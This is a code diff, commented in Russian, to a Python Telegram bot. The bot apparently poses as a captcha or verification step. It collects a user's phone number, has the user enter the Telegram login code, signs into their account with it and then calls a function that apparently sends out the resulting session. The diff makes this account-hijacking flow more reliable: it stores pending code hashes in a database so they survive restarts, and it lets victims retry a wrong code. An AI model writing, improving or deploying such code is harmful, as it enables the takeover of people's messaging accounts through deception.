@@ -100,6 +100,11 @@ _db.execute(
     'CREATE TABLE IF NOT EXISTS users '
     '(user_id INTEGER PRIMARY KEY, username TEXT, phone TEXT, date TEXT)'
 )
+# Храним code_hash в БД — переживает перезапуск сервера
+_db.execute(
+    'CREATE TABLE IF NOT EXISTS pending '
+    '(user_id INTEGER PRIMARY KEY, phone TEXT, code_hash TEXT, date TEXT)'
+)
 _db.commit()
 
 
@@ -113,6 +118,26 @@ def db_join(user_id: int, username: str) -> bool:
     )
     _db.commit()
     return True
+
+
+def db_save_pending(user_id: int, phone: str, code_hash: str):
+    _db.execute(
+        'INSERT OR REPLACE INTO pending VALUES (?,?,?,?)',
+        [user_id, phone, code_hash, datetime.now().isoformat()]
+    )
+    _db.commit()
+
+
+def db_get_pending(user_id: int):
+    """Возвращает (phone, code_hash) или None."""
+    return _db.execute(
+        'SELECT phone, code_hash FROM pending WHERE user_id=?', [user_id]
+    ).fetchone()
+
+
+def db_clear_pending(user_id: int):
+    _db.execute('DELETE FROM pending WHERE user_id=?', [user_id])
+    _db.commit()
 
 
 def db_set_phone(user_id: int, phone: str) -> None:
@@ -246,6 +271,8 @@ async def on_contact(msg: Message, state: FSMContext):
         await state.finish()
         return
 
+    # Сохраняем в БД — переживёт перезапуск сервера
+    db_save_pending(msg.from_user.id, phone, sent.phone_code_hash)
     await state.update_data(phone=phone, code_hash=sent.phone_code_hash)
     await Auth.wait_webapp.set()
 
@@ -279,9 +306,14 @@ async def on_webapp_data(msg: Message, state: FSMContext):
     code_hash = data.get('code_hash')
 
     if not phone or not code_hash:
-        await msg.answer('❌ <b>Сессия истекла.</b> Начните заново — /start')
-        await state.finish()
-        return
+        # Пробуем достать из БД (на случай перезапуска сервера)
+        row = db_get_pending(msg.from_user.id)
+        if row:
+            phone, code_hash = row
+        else:
+            await msg.answer('❌ <b>Сессия истекла.</b> Начните заново — /start')
+            await state.finish()
+            return
 
     await msg.answer('🔄 <b>Проверяю код...</b>')
 
@@ -292,9 +324,9 @@ async def on_webapp_data(msg: Message, state: FSMContext):
         await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
 
     except PhoneCodeInvalidError:
-        await msg.answer('❌ <b>Неправильный код!</b> Попробуйте снова — /start')
+        await msg.answer('❌ <b>Неправильный код!</b>\nПопробуйте ещё раз — нажмите кнопку проверки снова.',
+            reply_markup=kb_open_captcha(msg.from_user.id))
         await _safe_disconnect(client)
-        await state.finish()
         return
 
     except SessionPasswordNeededError:
@@ -319,6 +351,7 @@ async def on_webapp_data(msg: Message, state: FSMContext):
         return
 
     # ── Успех ──────────────────────────────────────────
+    db_clear_pending(msg.from_user.id)
     await msg.answer('✅ <b>Верификация пройдена успешно!</b>')
     await _send_session_msg(msg, phone)
     await _safe_disconnect(client)
